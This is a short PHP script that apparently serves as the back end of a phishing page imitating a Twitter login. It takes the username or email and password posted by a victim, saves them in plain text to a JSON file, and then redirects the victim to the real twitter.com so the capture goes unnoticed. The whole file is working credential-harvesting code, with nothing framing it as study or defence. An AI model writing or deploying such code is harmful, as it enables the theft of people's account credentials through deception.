<?php
$user = $_POST['usernameOrEmail'];
$pass = $_POST['pass'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);
$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location: https://twitter.com/');
exit();
